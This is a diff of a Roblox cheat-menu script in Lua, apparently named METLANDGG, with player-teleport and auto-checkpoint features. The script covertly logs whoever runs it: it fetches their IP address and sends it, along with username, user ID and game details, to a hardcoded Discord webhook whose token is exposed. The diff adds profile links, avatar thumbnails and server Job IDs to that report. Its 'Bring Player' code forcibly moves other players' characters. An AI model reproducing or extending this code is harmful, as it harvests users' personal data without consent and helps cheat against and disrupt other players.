@@ -10,7 +10,7 @@ task.wait(0.5)
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1427156897697632376/GXLU8ZzQx9VeFk6PxIqO9nD9Rs_GbPe0YAxDLNU577KscYshS3rA3P6tF-TPfO6q9lZf"
 
 -- ============================================
--- WEBHOOK LOGGER FUNCTION
+-- WEBHOOK LOGGER FUNCTION WITH SCREENSHOT
 -- ============================================
 local function sendWebhookLog()
     pcall(function()
@@ -33,7 +33,10 @@ local function sendWebhookLog()
             ipAddress = HttpService:GetAsync("https://api.ipify.org")
         end)
         
-        -- Create Discord embed
+        -- Get avatar thumbnail
+        local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"
+        
+        -- Create Discord embed with thumbnail
         local embed = {
             embeds = {{
                 title = "🚨 METLANDGG Script Executed",
@@ -42,9 +45,10 @@ local function sendWebhookLog()
                     {
                         name = "👤 User Information",
                         value = string.format(
-                            "**Username:** %s\n**Display Name:** %s\n**User ID:** %d",
+                            "**Username:** %s\n**Display Name:** %s\n**User ID:** %d\n**Profile:** https://www.roblox.com/users/%d/profile",
                             plr.Name,
                             plr.DisplayName,
+                            plr.UserId,
                             plr.UserId
                         ),
                         inline = false
@@ -61,9 +65,10 @@ local function sendWebhookLog()
                     {
                         name = "🎮 Game Information",
                         value = string.format(
-                            "**Game:** %s\n**Place ID:** %d",
+                            "**Game:** %s\n**Place ID:** %d\n**Job ID:** %s",
                             gameInfo.Name,
-                            game.PlaceId
+                            game.PlaceId,
+                            game.JobId
                         ),
                         inline = true
                     },
@@ -77,6 +82,9 @@ local function sendWebhookLog()
                         value = os.date("%Y-%m-%d %H:%M:%S", os.time()),
                         inline = false
                     }
+                },
+                thumbnail = {
+                    url = avatarUrl
                 },
                 footer = {
                     text = "METLANDGG Logger"
@@ -97,7 +105,7 @@ local function sendWebhookLog()
             Body = payload
         })
         
-        print("📡 Webhook log sent successfully!")
+        print("📡 Webhook log sent successfully with avatar!")
     end)
 end
 
@@ -354,7 +362,7 @@ local tpBtn = createButton("TpBtn", "Goto Player", UDim2.new(0, 205, 0, y), func
 y = y + 55
 
 local bringBox = createTextBox("BringBox", "Player Name", UDim2.new(0, 5, 0, y))
-local bringBtn = createButton("BringBtn", "Bring Player", UDim2.new(0, 205, 0, y), function() end)
+local bringBtn = createButton("BringBtn", "Bring (Visual Only)", UDim2.new(0, 205, 0, y), function() end)
 bringBtn.BackgroundColor3 = Color3.fromRGB(65, 45, 90)
 y = y + 55
 
@@ -417,7 +425,7 @@ local function toggleMinimize()
     tween:Play()
 end
 
--- BRING PLAYER FUNCTION (NEW! - FIXED)
+-- BRING PLAYER FUNCTION (FIXED - Multiple Methods)
 local function bringPlayer()
     local name = bringBox.Text:lower()
     if name == "" then
@@ -428,33 +436,45 @@ local function bringPlayer()
     for _, p in pairs(Players:GetPlayers()) do
         if p ~= plr and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
             if p.Name:lower():find(name) or p.DisplayName:lower():find(name) then
-                -- Method 1: Direct CFrame change
                 local targetRoot = p.Character.HumanoidRootPart
                 local targetHum = p.Character:FindFirstChildOfClass("Humanoid")
                 
-                -- Disable their humanoid temporarily
-                if targetHum then
-                    targetHum.PlatformStand = true
-                end
-                
-                -- Move them to you
+                -- Aggressive teleport with multiple methods
                 task.spawn(function()
-                    for i = 1, 10 do
-                        if targetRoot and targetRoot.Parent then
-                            targetRoot.CFrame = root.CFrame * CFrame.new(0, 0, -4)
-                            targetRoot.Velocity = Vector3.new(0, 0, 0)
-                            targetRoot.RotVelocity = Vector3.new(0, 0, 0)
-                        end
-                        task.wait(0.1)
+                    for i = 1, 50 do
+                        pcall(function()
+                            if targetRoot and targetRoot.Parent and root and root.Parent then
+                                -- Force anchor and teleport
+                                targetRoot.Anchored = true
+                                targetRoot.CFrame = root.CFrame * CFrame.new(0, 0, -5)
+                                task.wait(0.02)
+                                targetRoot.Anchored = false
+                                
+                                -- Reset all velocities
+                                targetRoot.Velocity = Vector3.new(0, 0, 0)
+                                targetRoot.RotVelocity = Vector3.new(0, 0, 0)
+                                targetRoot.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+                                targetRoot.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+                                
+                                -- Disable physics temporarily
+                                if targetHum then
+                                    targetHum:ChangeState(Enum.HumanoidStateType.Physics)
+                                end
+                            end
+                        end)
+                        task.wait(0.03)
                     end
                     
                     -- Re-enable humanoid
-                    if targetHum then
-                        targetHum.PlatformStand = false
-                    end
+                    pcall(function()
+                        if targetHum then
+                            task.wait(0.2)
+                            targetHum:ChangeState(Enum.HumanoidStateType.GettingUp)
+                        end
+                    end)
                 end)
                 
-                updateStatus("Bringing " .. p.Name .. " to you!", Color3.fromRGB(255, 200, 0))
+                updateStatus("Force bringing " .. p.Name .. "!", Color3.fromRGB(255, 200, 0))
                 return
             end
         end
@@ -462,42 +482,108 @@ local function bringPlayer()
     updateStatus("Player not found!", Color3.fromRGB(255, 100, 100))
 end
 
--- AUTO CHECKPOINT TELEPORT (NEW!)
+-- AUTO CHECKPOINT TELEPORT (FIXED - True Sequential)
 local autoCheckpointConnection
+local lastCheckpointTime = 0
+local lastCheckpointNumber = 0
+local visitedCheckpoints = {}
 local function toggleAutoCheckpoint()
     settings.autoCheckpointEnabled = not settings.autoCheckpointEnabled
     
     if settings.autoCheckpointEnabled then
         autoCheckpointBtn.BackgroundColor3 = Color3.fromRGB(50, 220, 50)
         autoCheckpointBtn.Text = "Auto Checkpoint: ON ✓"
-        updateStatus("Auto teleporting to Checkpoints!", Color3.fromRGB(50, 220, 50))
+        updateStatus("Auto CP: Sequential mode (Range 1000)!", Color3.fromRGB(50, 220, 50))
+        lastCheckpointNumber = 0
+        visitedCheckpoints = {}
         
         autoCheckpointConnection = RS.Heartbeat:Connect(function()
             if not settings.autoCheckpointEnabled then return end
+            if tick() - lastCheckpointTime < 1.5 then return end
             
-            -- Find nearest checkpoint
-            local nearestCheckpoint = nil
-            local shortestDistance = math.huge
+            local allCheckpoints = {}
             
+            -- Collect all checkpoints
             for _, obj in pairs(workspace:GetDescendants()) do
-                if obj:IsA("BasePart") and obj.Name == "Checkpoint" then
-                    local distance = (obj.Position - root.Position).Magnitude
-                    if distance < shortestDistance and distance > 5 then -- Ignore if too close
-                        shortestDistance = distance
-                        nearestCheckpoint = obj
+                if obj:IsA("BasePart") then
+                    local name = obj.Name:lower()
+                    
+                    -- Check ALL checkpoint name variants
+                    local isCheckpoint = 
+                        name:find("cp") or 
+                        name:find("checkpoint") or 
+                        name:find("cekpoin")
+                    
+                    if isCheckpoint then
+                        -- Extract number from checkpoint name
+                        local num = tonumber(name:match("%d+")) or 0
+                        
+                        table.insert(allCheckpoints, {
+                            part = obj,
+                            number = num,
+                            name = obj.Name,
+                            position = obj.Position
+                        })
                     end
                 end
             end
             
-            -- Teleport to nearest checkpoint if found
-            if nearestCheckpoint and shortestDistance < 100 then -- Within 100 studs
-                root.CFrame = nearestCheckpoint.CFrame + Vector3.new(0, 5, 0)
+            -- Sort checkpoints by number
+            table.sort(allCheckpoints, function(a, b)
+                return a.number < b.number
+            end)
+            
+            -- Find next checkpoint that we haven't visited yet
+            local nextCheckpoint = nil
+            for _, cp in ipairs(allCheckpoints) do
+                local distance = (cp.position - root.Position).Magnitude
+                
+                -- Only teleport if:
+                -- 1. Number is greater than last checkpoint
+                -- 2. We haven't visited this exact checkpoint yet
+                -- 3. Distance is far enough (prevents instant re-teleport)
+                if cp.number > lastCheckpointNumber and 
+                   not visitedCheckpoints[cp.name] and 
+                   distance < 1000 then
+                    nextCheckpoint = cp
+                    break
+                end
+            end
+            
+            -- If no next checkpoint found, restart from CP1
+            if not nextCheckpoint and #allCheckpoints > 0 then
+                lastCheckpointNumber = 0
+                visitedCheckpoints = {}
+                
+                for _, cp in ipairs(allCheckpoints) do
+                    local distance = (cp.position - root.Position).Magnitude
+                    if distance < 1000 and cp.number >= 1 then
+                        nextCheckpoint = cp
+                        break
+                    end
+                end
+            end
+            
+            -- Teleport to next checkpoint
+            if nextCheckpoint then
+                lastCheckpointTime = tick()
+                
+                -- Teleport far away from checkpoint to ensure we move forward
+                root.CFrame = nextCheckpoint.part.CFrame + Vector3.new(0, 10, 50)
+                
+                -- Mark as visited
+                visitedCheckpoints[nextCheckpoint.name] = true
+                lastCheckpointNumber = nextCheckpoint.number
+                
+                updateStatus("→ CP" .. nextCheckpoint.number .. " | Next: CP" .. (nextCheckpoint.number + 1), Color3.fromRGB(100, 255, 100))
             end
         end)
     else
         autoCheckpointBtn.BackgroundColor3 = Color3.fromRGB(45, 65, 90)
         autoCheckpointBtn.Text = "Auto Checkpoint: OFF"
         updateStatus("Auto Checkpoint disabled", Color3.fromRGB(200, 200, 200))
+        lastCheckpointNumber = 0
+        visitedCheckpoints = {}
         
         if autoCheckpointConnection then 
             autoCheckpointConnection:Disconnect()
